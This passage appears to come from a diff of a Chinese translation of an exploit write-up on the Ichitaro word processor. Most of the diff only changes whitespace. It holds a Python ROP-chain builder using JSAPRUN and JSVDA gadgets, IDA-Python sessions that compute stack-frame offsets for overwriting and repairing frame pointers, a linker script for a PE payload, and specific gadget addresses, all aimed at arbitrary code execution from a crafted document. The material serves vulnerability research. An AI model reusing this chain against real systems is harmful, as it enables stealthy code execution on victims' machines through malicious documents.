 stack.send(JSAPRUN.exchange_eax_ebx)
@@ -1512,58 +1512,58 @@ stack.send(JSAPRUN.exchange_eax_ebx)
   
 ```
 class ReceiverMarker(StackReceiver):
-    '''Experimental class for referencing a specific slot within the stack and marking the snippet where the slot is referenced.'''
-    def __init__(self):
-        self._collected = collected = []
-        super(ReceiverMarker, self).__init__(collected.append)
-        self._marked = []
- 
-    def use(self, snippet, *integers):
-        '''Mark the specified snippet where a slot should be calculated from.'''
-        self.send(snippet, *integers)
-        self._marked = self._collected[:]
- 
+    '''Experimental class for referencing a specific slot within the stack and marking the snippet where the slot is referenced.'''
+    def __init__(self):
+        self._collected = collected = []
+        super(ReceiverMarker, self).__init__(collected.append)
+        self._marked = []
+ 
+    def use(self, snippet, *integers):
+        '''Mark the specified snippet where a slot should be calculated from.'''
+        self.send(snippet, *integers)
+        self._marked = self._collected[:]
+ 
 class Stacker(StackReceiver):
-    '''Experimental class for referencing a specific slot within the stack to be either read from or written to.'''
-    def __init__(self, stack):
-        super(Stacker, self).__init__(stack.append)
-        self._stack = stack
- 
-    @contextlib.contextmanager
-    def reference(self, snippet, *integers, **index):
-        '''Reference a slot within the stack and use it as a parameter to the specified snippet.'''
-        marker = ReceiverMarker()
-        try:
-            abort = None
-            yield marker
-        except Exception as exception:
-            abort = exception
-        finally:
-            if abort: raise abort
- 
-        # build the stack containing the entire contents that were collected.
-        tempstack = parray.type(_object_=ptype.pointer_t).a
-        [ tempstack.append(item) for item in marker._collected ]
- 
-        # build the stack that was marked by the caller.
-        markstack = parray.type(_object_=ptype.pointer_t).a
-        [ markstack.append(item) for item in marker._marked ]
- 
-        # build the stack that is being used to adjust towards a specific index.
-        adjuststack = parray.type(_object_=ptype.pointer_t)
-        adjuststack = adjuststack.alloc(length=index.get('index', 0))
- 
-        # push the caller's requested instruction onto the stack using the size that was marked.
-        state = self._state
-        offset, adjust, release = snippet
-        state.send(offset)
-        items = [item for item in integers]
-        state.send(items + [tempstack.size() - markstack.size() + adjuststack.size()])
-        state.send(release)
- 
-        # now we can push all of the elements that the caller wanted onto the stack.
-        Freceive = self._receiver
-        [ Freceive(item) for item in tempstack ]
+    '''Experimental class for referencing a specific slot within the stack to be either read from or written to.'''
+    def __init__(self, stack):
+        super(Stacker, self).__init__(stack.append)
+        self._stack = stack
+ 
+    @contextlib.contextmanager
+    def reference(self, snippet, *integers, **index):
+        '''Reference a slot within the stack and use it as a parameter to the specified snippet.'''
+        marker = ReceiverMarker()
+        try:
+            abort = None
+            yield marker
+        except Exception as exception:
+            abort = exception
+        finally:
+            if abort: raise abort
+ 
+        # build the stack containing the entire contents that were collected.
+        tempstack = parray.type(_object_=ptype.pointer_t).a
+        [ tempstack.append(item) for item in marker._collected ]
+ 
+        # build the stack that was marked by the caller.
+        markstack = parray.type(_object_=ptype.pointer_t).a
+        [ markstack.append(item) for item in marker._marked ]
+ 
+        # build the stack that is being used to adjust towards a specific index.
+        adjuststack = parray.type(_object_=ptype.pointer_t)
+        adjuststack = adjuststack.alloc(length=index.get('index', 0))
+ 
+        # push the caller's requested instruction onto the stack using the size that was marked.
+        state = self._state
+        offset, adjust, release = snippet
+        state.send(offset)
+        items = [item for item in integers]
+        state.send(items + [tempstack.size() - markstack.size() + adjuststack.size()])
+        state.send(release)
+ 
+        # now we can push all of the elements that the caller wanted onto the stack.
+        Freceive = self._receiver
+        [ Freceive(item) for item in tempstack ]
 ```  
   
   
@@ -1575,24 +1575,24 @@ stack.send(JSAPRUN.assign_pop_eax, divmod(layout['vprotect']['dynamic_buffer'].g
 stack.send(JSAPRUN.load_slotX_eax_eax)
 stack.send(JSAPRUN.exchange_eax_edi)
 stack.send(JSAPRUN.return_0)
- 
+ 
 # now we write %edi directly into slot 1 of whatever follows us.
 with stack.reference(JSAPRUN.assign_pop_eax, index=1) as store:
-    store.use(JSAPRUN.store_edi_sib1_eax_esp_0)     # mark the index from this stack position
-    store.send(JSAPRUN.assign_pop_eax, layout['object_OSEG.vftable'].getoffset() - layout['context'].getoffset())
-    store.send(JSAPRUN.arithmetic_add_eax_ecx)
- 
-    # adjust %ecx to move from layout.context to layout.object_OSEG.vftable so
-    # that we can eventually call 8(%ecx) later to read from the opened stream.
-    delta_object_oseg = layout['context']['object(OSEG)'].getoffset() - layout['object_OSEG.vftable'].getoffset()
-    assert(not(delta_object_oseg % 4)), "{:s} is not aligned from {:s} and will be inaccessible.".format(layout['context']['object(OSEG)'].instance(), layout['object_OSEG.vftable'].instance())
-    store.send(JSAPRUN.assign_pop_eax, divmod(delta_object_oseg, 4)[0])
-    store.send(JSAPRUN.load_slotX_eax_eax)
- 
+    store.use(JSAPRUN.store_edi_sib1_eax_esp_0)     # mark the index from this stack position
+    store.send(JSAPRUN.assign_pop_eax, layout['object_OSEG.vftable'].getoffset() - layout['context'].getoffset())
+    store.send(JSAPRUN.arithmetic_add_eax_ecx)
+ 
+    # adjust %ecx to move from layout.context to layout.object_OSEG.vftable so
+    # that we can eventually call 8(%ecx) later to read from the opened stream.
+    delta_object_oseg = layout['context']['object(OSEG)'].getoffset() - layout['object_OSEG.vftable'].getoffset()
+    assert(not(delta_object_oseg % 4)), "{:s} is not aligned from {:s} and will be inaccessible.".format(layout['context']['object(OSEG)'].instance(), layout['object_OSEG.vftable'].instance())
+    store.send(JSAPRUN.assign_pop_eax, divmod(delta_object_oseg, 4)[0])
+    store.send(JSAPRUN.load_slotX_eax_eax)
+ 
 # "store.use" overwrites index 0+1, 0xBBBBBBBB, in the following sequence.
 # int __stdcall object_OSEG::method_read_2c310(JSVDA::object_OSEG *ap_object_0, BYTE *ap_buffer_8, int av_size_c, int *ap_resultSize_c)
 stack.send(JSVDA.callsib1_N_ecx_8__eax__ecx, 0xBBBBBBBB, 0x1000, layout['unused_result'].getoffset())
- 
+ 
 # calling object_OSEG::method_read_2c310 cleans up all args, but prior
 # sequence misses 1.. which we take care of here.
 stack.skip(1)
@@ -1625,37 +1625,37 @@ object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76beat的函
 ```
 # Assign the path through the backtrace that ends up dereferencing from our virtual method table.
 Python> backtrace = [0x3bbb2de4, 0x3be276be, 0x3be26cb2, 0x3c1faf0f]
- 
+ 
 Python> pp(listmap(func.name, backtrace))
 ['object_OFRM::openStreamByName?_132de4',
  'object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be',
  'object_9c2044::parseStream(DocumentEditStyles)_3a6cb2',
  'object_9c2044::method_processStreams_77af0f']
- 
+ 
 # Grab the frame members for each function in the backtrace in order to study their layout.
 Python> layout = struc.right(func.frame(backtrace[-1]), [func.frame(f) for f in backtrace[:-1]])
- 
+ 
 # Display each of the frames.
 Python> pp(layout)
 [<class 'structure' name='$ F3BBB2DE4' offset=-0x344 size=0x20>,
  <class 'structure' name='$ F3BE276BE' offset=-0x324 size=0xa8>,
  <class 'structure' name='$ F3BE26CB2' offset=-0x27c size=0x18>,
  <class 'structure' name='$ F3C1FAF0F' offset=-0x264 size=0x278>]
- 
+ 
 # List the location of each preserved frame pointer in our callstack.
 Python> [(print(frame), frame.list(' *')) for frame in layout]
 <class 'structure' name='$ F3BBB2DE4' offset=-0x344 size=0x20>
-[2]  -33c:+0x4 char[4] ' s' [(<class 'int'>, 1), 4]
-[3]  -338:+0x4 char[4] ' r' [(<class 'int'>, 1), 4]
+[2]  -33c:+0x4 char[4] ' s' [(<class 'int'>, 1), 4]
+[3]  -338:+0x4 char[4] ' r' [(<class 'int'>, 1), 4]
 <class 'structure' name='$ F3BE276BE' offset=-0x324 size=0xa8>
 [25] -298:+0x4 char[4] ' s' [(<class 'int'>, 1), 4]
 [26] -294:+0x4 char[4] ' r' [(<class 'int'>, 1), 4]
 <class 'structure' name='$ F3BE26CB2' offset=-0x27c size=0x18>
-[0]  -278:+0x4 char[4] ' s' [(<class 'int'>, 1), 4]
-[1]  -274:+0x4 char[4] ' r' [(<class 'int'>, 1), 4]
+[0]  -278:+0x4 char[4] ' s' [(<class 'int'>, 1), 4]
+[1]  -274:+0x4 char[4] ' r' [(<class 'int'>, 1), 4]
 <class 'structure' name='$ F3C1FAF0F' offset=-0x264 size=0x278>
-[ 9]   -8:+0x4 char[4] ' s' [(<class 'int'>, 1), 4]
-[10]   -4:+0x4 char[4] ' r' [(<class 'int'>, 1), 4]
+[ 9]   -8:+0x4 char[4] ' s' [(<class 'int'>, 1), 4]
+[10]   -4:+0x4 char[4] ' r' [(<class 'int'>, 1), 4]
 ```  
   
   
@@ -1667,19 +1667,19 @@ object_9c2044::method_processStreams_77af0f指针
 # Owner of the frame pointer that we have access to.
 Python> func.name(func.by(layout[0]))
 'object_OFRM::openStreamByName?_132de4'
- 
+ 
 Python> layout[0].members.list(' *')
 [2] -33c:+0x4 char[4] ' s' [(<class 'int'>, 1), 4]
 [3] -338:+0x4 char[4] ' r' [(<class 'int'>, 1), 4]
- 
+ 
 # Owner of the frame pointer that we've overwritten.
 Python> func.name(func.by(layout[-1]))
 'object_9c2044::method_processStreams_77af0f'
- 
+ 
 Python> layout[-1].members.list(' *')
 [ 9] -8:+0x4 char[4] ' s' [(<class 'int'>, 1), 4]
 [10] -4:+0x4 char[4] ' r' [(<class 'int'>, 1), 4]
- 
+ 
 # Calculate the delta between both of these locations.
 Python> layout[-1].members.by(' s').offset - layout[0].members.by(' s').offset
 0x334
@@ -1705,18 +1705,18 @@ Python> pp(layout[:-1])
 [<class 'structure' name='$ F3BBB2DE4' offset=-0x344 size=0x20>,
  <class 'structure' name='$ F3BE276BE' offset=-0x324 size=0xa8>,
  <class 'structure' name='$ F3BE26CB2' offset=-0x27c size=0x18>]
- 
+ 
 Python> pp(listmap(func.name, map(func.by, layout[:-1])))
 ['object_OFRM::openStreamByName?_132de4',
  'object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be',
  'object_9c2044::parseStream(DocumentEditStyles)_3a6cb2']
- 
+ 
 # Identify the two members that we will need to use to locate the frame pointer
 # that we will need to overwrite in order to repair the call stack.
 Python> pp((layout[0].members.by(' s'), layout[2].members.by(' s')))
 (<member '$ F3BBB2DE4. s' index=2 offset=-0x33c size=+0x4 typeinfo='char[4]'>,
  <member '$ F3BE26CB2. s' index=0 offset=-0x278 size=+0x4 typeinfo='char[4]'>)
- 
+ 
 # Calculate the difference between the current frame pointer, and the preserved
 # frame pointer that we will overwrite.
 Python> layout[0].members.by(' s').offset - layout[2].members.by(' s').offset
@@ -1742,25 +1742,25 @@ Python> pp(listmap(func.name, callstack))
  'object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be',
  'object_9c2044::parseStream(DocumentEditStyles)_3a6cb2',
  'object_9c2044::method_processStreams_77af0f']
- 
+ 
 # Convert our callstack into a list of frames.
 Python> layout = struc.right(func.frame(callstack[-1]), listmap(func.frame, callstack[:-1]))
- 
+ 
 # List all frame variables that have a type.
 Python> layout[-1].list(typed=True)
-[ 4] -254:+0x18  frame_77af0f::field_24c 'lv_struc_24c'      <class 'structure' name='frame_77af0f::field_24c' offset=-0x254 size=0x18>
-[ 6] -238:+0x4       JSVDA::object_OFRM* 'lp_oframe_230'     (<class 'type'>, 4)
-[ 7] -234:+0x228           object_2f27f8 'lv_object_22c'     <class 'structure' name='object_2f27f8' offset=-0x234 size=0x228>
-[11]    0:+0x4       JSVDA::object_OFRM* 'ap_oframe_0'       (<class 'type'>, 4)
-[12]    4:+0x4              unsigned int 'av_documentType_4' (<class 'int'>, 4)
-[13]    8:+0x4              unsigned int 'av_flags_8'        (<class 'int'>, 4)
-[14]    c:+0x4             struc_79aa9a* 'ap_stackobject_c'  (<class 'type'>, 4)
-[15]   10:+0x4                       int 'ap_null_10'        (<class 'int'>, 4)
- 
+[ 4] -254:+0x18  frame_77af0f::field_24c 'lv_struc_24c'      <class 'structure' name='frame_77af0f::field_24c' offset=-0x254 size=0x18>
+[ 6] -238:+0x4       JSVDA::object_OFRM* 'lp_oframe_230'     (<class 'type'>, 4)
+[ 7] -234:+0x228           object_2f27f8 'lv_object_22c'     <class 'structure' name='object_2f27f8' offset=-0x234 size=0x228>
+[11]    0:+0x4       JSVDA::object_OFRM* 'ap_oframe_0'       (<class 'type'>, 4)
+[12]    4:+0x4              unsigned int 'av_documentType_4' (<class 'int'>, 4)
+[13]    8:+0x4              unsigned int 'av_flags_8'        (<class 'int'>, 4)
+[14]    c:+0x4             struc_79aa9a* 'ap_stackobject_c'  (<class 'type'>, 4)
+[15]   10:+0x4                       int 'ap_null_10'        (<class 'int'>, 4)
+ 
 # List all frame variables that reference the object used to read from an opened document.
 Python> layout[-1].list(structure=struc.by('JSVDA::object_OFRM'))
 [ 6] -238:+0x4 JSVDA::object_OFRM* 'lp_oframe_230' (<class 'type'>, 4)
-[11]    0:+0x4 JSVDA::object_OFRM* 'ap_oframe_0'   (<class 'type'>, 4)
+[11]    0:+0x4 JSVDA::object_OFRM* 'ap_oframe_0'   (<class 'type'>, 4)
 ```  
   
   
@@ -1768,9 +1768,9 @@ Python> layout[-1].list(structure=struc.by('JSVDA::object_OFRM'))
   
 ```
 Python>struc.search('*_OFRM').members
-<class 'structure' name='JSVDA::object_OFRM' size=0x8>  # [alloc.tag] OFRM
-[0] 0+0x4 int 'p_vftable_0' (<class 'int'>, 4)          # [vftable] 0x278186F0
-[1] 4+0x4 int 'v_index_4'   (<class 'int'>, 4)          # {'note': 'object_117c5 handle', 'alloc.tag': 'MFCM'}
+<class 'structure' name='JSVDA::object_OFRM' size=0x8>  # [alloc.tag] OFRM
+[0] 0+0x4 int 'p_vftable_0' (<class 'int'>, 4)          # [vftable] 0x278186F0
+[1] 4+0x4 int 'v_index_4'   (<class 'int'>, 4)          # {'note': 'object_117c5 handle', 'alloc.tag': 'MFCM'}
 ```  
   
   
@@ -1798,102 +1798,102 @@ __load_import_end符号之间。
 ENTRY(_start)
 STARTUP(src/entry.o)
 TARGET(pe-i386)
- 
+ 
 SECTIONS {
-    HIDDEN(_loc_counter = .);
-    HIDDEN(_loc_align = 0x10);
- 
-    .load _loc_counter : {
-        __load_start = ABSOLUTE(.);
-        KEEP(*(.init))
-        KEEP(*(.fini))
-        . = ALIGN(_loc_align);
- 
-        __load_size = .; LONG(__load_end - __load_start);
-        __load_segment_start = .; LONG(__segment_start);
-        __load_segment_end = .; LONG(__segment_end);
-        __load_reloc_start = .; LONG(__reloc_start);
-        __load_reloc_end = .; LONG(__reloc_end);
-        __load_import_start = .; LONG(__import_start);
-        __load_import_end = .; LONG(__import_end);
- 
-        __load_end = ABSOLUTE(.);
-        . = ALIGN(_loc_align);
-    }
-    _loc_counter += SIZEOF(.load);
- 
-    .imports _loc_counter : {
-        __import_size = ABSOLUTE(.); LONG(__import_end - __import_start);
-        __import_start = ABSOLUTE(.);
-        *(.idata)
-        *(SORT_BY_NAME(.idata$*))
-        __import_end = ABSOLUTE(.);
- 
-        . = ALIGN(_loc_align);
-    }
-    _loc_counter += SIZEOF(.imports);
- 
-    __segment_start = ABSOLUTE(.);
- 
-    .text _loc_counter : {
-        *(.text)
-        *(SORT_BY_NAME(.text$*))
-        *(.text.*)
-        . = ALIGN(_loc_align);
- 
-        __CTOR_LIST__ = ABSOLUTE(.);
-        LONG((__CTOR_END__ - __CTOR_LIST__) / 4 - 2);
-        KEEP(*(.ctors));
-        KEEP(*(.ctor));
-        KEEP(*SORT_BY_NAME(.ctors.*));
-        LONG(0);
-        __CTOR_END__ = ABSOLUTE(.);
- 
-        __DTOR_LIST__ = ABSOLUTE(.);
-        LONG((__DTOR_END__ - __DTOR_LIST__) / 4 - 2);
-        KEEP(*(.dtors));
-        KEEP(*(.dtor));
-        KEEP(*SORT_BY_NAME(.dtors.*));
-        LONG(0);
-        __DTOR_END__ = ABSOLUTE(.);
- 
-        . = ALIGN(_loc_align);
-    }
-    _loc_counter += SIZEOF(.text);
- 
-    .data _loc_counter : {
-        *(.data)
-        *(SORT_BY_NAME(.data$*))
-        *(.data.*)
-        *(.*data)
-        *(.*data.*)
- 
-        . = ALIGN(_loc_align);
-    }
-    _loc_counter += SIZEOF(.data);
- 
-    __segment_end = ABSOLUTE(.);
- 
-    .relocations _loc_counter : {
-        __reloc_size = ABSOLUTE(.); LONG(__reloc_end - __reloc_start);
-        __reloc_start = ABSOLUTE(.);
-        *(.reloc)
-        __reloc_end = ABSOLUTE(.);
- 
-        . = ALIGN(_loc_align);
-    }
-    _loc_counter += SIZEOF(.relocations);
- 
-    .bss (NOLOAD) : {
-        *(.bss)
-        *(COMMON)
-    }
- 
-    .discarded (NOLOAD) : {
-        *(.*)
-    }
- 
-    __end__ = _loc_counter;
+    HIDDEN(_loc_counter = .);
+    HIDDEN(_loc_align = 0x10);
+ 
+    .load _loc_counter : {
+        __load_start = ABSOLUTE(.);
+        KEEP(*(.init))
+        KEEP(*(.fini))
+        . = ALIGN(_loc_align);
+ 
+        __load_size = .; LONG(__load_end - __load_start);
+        __load_segment_start = .; LONG(__segment_start);
+        __load_segment_end = .; LONG(__segment_end);
+        __load_reloc_start = .; LONG(__reloc_start);
+        __load_reloc_end = .; LONG(__reloc_end);
+        __load_import_start = .; LONG(__import_start);
+        __load_import_end = .; LONG(__import_end);
+ 
+        __load_end = ABSOLUTE(.);
+        . = ALIGN(_loc_align);
+    }
+    _loc_counter += SIZEOF(.load);
+ 
+    .imports _loc_counter : {
+        __import_size = ABSOLUTE(.); LONG(__import_end - __import_start);
+        __import_start = ABSOLUTE(.);
+        *(.idata)
+        *(SORT_BY_NAME(.idata$*))
+        __import_end = ABSOLUTE(.);
+ 
+        . = ALIGN(_loc_align);
+    }
+    _loc_counter += SIZEOF(.imports);
+ 
+    __segment_start = ABSOLUTE(.);
+ 
+    .text _loc_counter : {
+        *(.text)
+        *(SORT_BY_NAME(.text$*))
+        *(.text.*)
+        . = ALIGN(_loc_align);
+ 
+        __CTOR_LIST__ = ABSOLUTE(.);
+        LONG((__CTOR_END__ - __CTOR_LIST__) / 4 - 2);
+        KEEP(*(.ctors));
+        KEEP(*(.ctor));
+        KEEP(*SORT_BY_NAME(.ctors.*));
+        LONG(0);
+        __CTOR_END__ = ABSOLUTE(.);
+ 
+        __DTOR_LIST__ = ABSOLUTE(.);
+        LONG((__DTOR_END__ - __DTOR_LIST__) / 4 - 2);
+        KEEP(*(.dtors));
+        KEEP(*(.dtor));
+        KEEP(*SORT_BY_NAME(.dtors.*));
+        LONG(0);
+        __DTOR_END__ = ABSOLUTE(.);
+ 
+        . = ALIGN(_loc_align);
+    }
+    _loc_counter += SIZEOF(.text);
+ 
+    .data _loc_counter : {
+        *(.data)
+        *(SORT_BY_NAME(.data$*))
+        *(.data.*)
+        *(.*data)
+        *(.*data.*)
+ 
+        . = ALIGN(_loc_align);
+    }
+    _loc_counter += SIZEOF(.data);
+ 
+    __segment_end = ABSOLUTE(.);
+ 
+    .relocations _loc_counter : {
+        __reloc_size = ABSOLUTE(.); LONG(__reloc_end - __reloc_start);
+        __reloc_start = ABSOLUTE(.);
+        *(.reloc)
+        __reloc_end = ABSOLUTE(.);
+ 
+        . = ALIGN(_loc_align);
+    }
+    _loc_counter += SIZEOF(.relocations);
+ 
+    .bss (NOLOAD) : {
+        *(.bss)
+        *(COMMON)
+    }
+ 
+    .discarded (NOLOAD) : {
+        *(.*)
+    }
+ 
+    __end__ = _loc_counter;
 }
 ```  
   
@@ -1910,8 +1910,8 @@ SECTIONS {
 %eax为正确的值来告诉调用者要么无法打开流，要么已经成功打开。分配结果后，我们需要使用常规的帧指针退出来离开被劫持的函数并恢复执行，就像什么都没发生一样。下面的两个地址就可以做到这一点。由于被劫持的帧指针在执行我们的有效负载之前已被修复，因此应用程序将继续尝试解析和加载文档的其余内容，就好像没有发生任何可怕的事情一样。  
   
 ```
-JSAPRUN.DLL    0x6100e5cf: pop eax; ret;
-JSAPRUN.DLL    0x6100104f: leave; ret;
+JSAPRUN.DLL    0x6100e5cf: pop eax; ret;
+JSAPRUN.DLL    0x6100104f: leave; ret;
 ```  
   
   
@@ -1920,7 +1920,7 @@ JSAPRUN.DLL    0x6100104f: leave; ret;
 当谈到利用现代操作系统上的内存损坏漏洞时，通用利用技术的时代早已一去不复返了。开发技术是特定于应用程序的，开发它们需要对其内部工作原理有更深入的了解，而由于高级语言的抽象，原始开发人员通常不知道这些工作原理。虽然交互式执行环境或脚本语言的存在提供了几乎无限的利用灵活性，但在像 Ichitaro 的环境中，利用开发人员必须将许多不同的副作用链接在一起才能实现一次性利用。  
   
   
-在所展示的案例中，单个漏洞被滥用，最终实现了任意代码执行。当漏洞利用需要链接多个漏洞时，情况通常并非如此。这通常使得判断单个漏洞的严重性变得困难，但是像这里介绍的那样的利用演示开发了一个等价类，使我们能够做出明智的决策，而无需演示每个实例的利用情况。   
+在所展示的案例中，单个漏洞被滥用，最终实现了任意代码执行。当漏洞利用需要链接多个漏洞时，情况通常并非如此。这通常使得判断单个漏洞的严重性变得困难，但是像这里介绍的那样的利用演示开发了一个等价类，使我们能够做出明智的决策，而无需演示每个实例的利用情况。   
   
   
   
